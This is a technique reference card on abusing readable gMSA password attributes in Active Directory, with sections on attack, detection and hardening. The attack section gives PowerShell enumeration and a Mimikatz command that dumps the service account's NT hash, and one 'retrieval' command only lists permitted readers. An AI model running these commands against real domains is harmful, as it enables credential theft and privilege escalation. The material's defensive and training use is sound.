# [CA-UNSC-005]: gMSA Credentials Exposure

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-005 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Credentials In Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Group Managed Service Accounts (gMSA) are designed to be secure, with AD managing the password. However, the password blob is retrievable by any computer/user granted access in the `msDS-AllowedToRetrieveManagedPassword` attribute. If an attacker compromises *any* host authorized to use the gMSA, or finds a misconfigured ACL allowing a user to read this attribute, they can request the gMSA's password (NT hash) and use it.
- **Attack Surface:** `msDS-AllowedToRetrieveManagedPassword` ACLs.
- **Business Impact:** **Privilege Escalation**. gMSAs often run critical services (SQL, IIS) with high privileges.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Compromised Account in the "Allowed to Retrieve" list.
- **Tools:**
    - [GMSAPasswordReader](https://github.com/Z-Labs/GMSAPasswordReader)
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Enumeration**
Find who can read the password.
```powershell
Get-DomainObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" -Properties Name,msDS-AllowedToRetrieveManagedPassword
```

**Step 2: Retrieval (From Allowed Host)**
Run this as SYSTEM on the allowed host, or as the allowed user.
```powershell
# Built-in (requires ActiveDirectory module)
Get-ADServiceAccount -Identity svc_sql -Properties PrincipalsAllowedToRetrieveManagedPassword

# Mimikatz (to dump hash)
lsadump::gmsa /account:svc_sql$
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4662 | Access to attribute `msDS-ManagedPassword`. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Least Privilege:** Audit `msDS-AllowedToRetrieveManagedPassword`. Ensure only specific computer accounts (not groups of users) are listed.
*   **Tiering:** Ensure gMSAs for Tier 0 services are only retrievable by Tier 0 hosts.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-001]
> **Next Logical Step:** [LAT-AD-001]
